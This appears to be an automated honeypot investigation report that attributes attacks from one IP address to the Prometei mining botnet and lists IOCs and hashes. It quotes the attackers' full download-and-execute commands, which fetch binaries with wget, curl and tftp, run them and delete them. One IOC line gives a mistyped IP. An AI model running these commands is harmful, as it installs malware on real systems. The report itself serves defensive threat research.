### **Honeypot Attack Research Report: Prometei Crypto Mining Investigation**

**Report Generation Time:** 2025-11-02T16:09:39.341542Z

**Timeframe of Investigation:** 2025-09-28T00:00:00.000Z - 2025-10-28T23:59:59.999Z

**Files Used to Generate Report:**
*   Internal Honeypot Logs (queried via `kibanna_discover_query` and `match_query`)
*   External Threat Intelligence (via `search_agent`)

---

### **Executive Summary**

This report details an investigation into a series of attacks targeting our honeypot network, consistent with the activity of the Prometei crypto-mining botnet. The investigation, initiated based on specific command-line inputs, confirms that a threat actor operating from the IP address **94.156.152.237** successfully executed malicious commands on our honeypots. The activity involved attempts to download and execute several malicious files, including ELF binaries named `x86` and `bot`. This behavior, combined with the command structure, aligns with known Tactics, Techniques, and Procedures (TTPs) of the Prometei malware, which is designed to mine cryptocurrency and steal credentials.

---

### **Investigation Details**

The investigation began by querying for three specific command-line inputs provided by the user within the specified timeframe.

**1. Command Execution Analysis:**

Evidence was found for two of the three suspicious commands:

*   **Command 1:** `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237/bins/x86; curl -O http://94.156.152.237/bins/x86; chmod 777 x86; ./x86; tftp 94.156.152.237 -c get x86; chmod 777 x86; ./x86; rm -rf x86`
    *   **Finding:** This command was observed on **2025-10-19T14:31:04.036Z** targeting the `sens-tel` honeypot (34.165.197.224). The command attempts to download an ELF binary named `x86` from multiple protocols (wget, curl, tftp), make it executable, run it, and then remove the evidence.

*   **Command 2:** `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237:6677/bot; chmod 777 *; ./bot`
    *   **Finding:** This command was observed on **2025-10-20T19:59:08.356Z** targeting the `sens-ny` honeypot (161.35.180.163). This command downloads a file named `bot` from a non-standard port (6677), makes it executable, and runs it.

The structure of these commands—navigating to temporary directories and using multiple methods to download and execute payloads—is a common TTP for malware attempting to gain a foothold on a system.

**2. Attacker Infrastructure Analysis:**

All commands pointed to a single source IP address for payload delivery: **94.156.152.237**. An investigation into this IP revealed the following:

*   **ASN Information:** The IP is registered to **AS214209, Internet Magnate (Pty) Ltd** in Bulgaria.
*   **Suricata Alerts:** Our network intrusion detection system, Suricata, generated multiple alerts related to this IP address. Notably, it triggered the signature: **"ET INFO Executable and linking format (ELF) file download Over HTTP"**. This confirms that the IP address was used to serve malicious executable files to our honeypots.
*   **Downloaded Files:** Log analysis shows that the IP address successfully served several files, including:
    *   `/bins/x86`
    *   `/bot` (MD5: `4b0ec31e54fcac73a31e2342f7e07b1d`)
    *   `/sigma.sh` (MD5: `599161e66c1fc12760ee9a4031a35b7f`)

**3. Correlation with Prometei Malware:**

Research on the Prometei botnet reveals that the observed activities are highly consistent with its known characteristics:

*   **Multi-platform Threat:** Prometei is known to target both Linux and Windows systems. The use of ELF binaries (`x86`, `bot`) and shell scripts (`sigma.sh`) confirms activity targeting Linux-based environments.
*   **Modular Payloads:** The downloading of different named files aligns with Prometei's modular architecture.
*   **Primary Objective:** The ultimate goal of Prometei is cryptocurrency mining (specifically Monero) and credential theft. The observed commands are typical of the initial infection stage, designed to establish persistence and download the primary mining/stealing modules.

---

### **Indicators of Compromise (IOCs)**

The following IOCs were identified during the investigation:

*   **Attacker IP Address:**
    *   `94.156.152.237`
*   **File Names:**
    *   `x86`
    *   `bot`
    *   `sigma.sh`
*   **File Hashes (MD5):**
    *   `4b0ec31e54fcac73a31e2342f7e07b1d` (bot)
    *   `599161e66c1fc12760ee9a4031a35b7f` (sigma.sh)
*   **Malicious Commands:**
    *   `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://9.156.152.237/bins/x86; ...`
    *   `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237:6677/bot; ...`

---

### **Conclusion**

The evidence strongly indicates that our honeypot network was targeted by the Prometei botnet. The attacker, using IP address **94.156.152.237**, executed commands to download and run malicious ELF binaries. This activity is consistent with the initial stage of a crypto-mining infection. It is recommended that the identified IP address and file hashes be added to blocklists to prevent further infection attempts.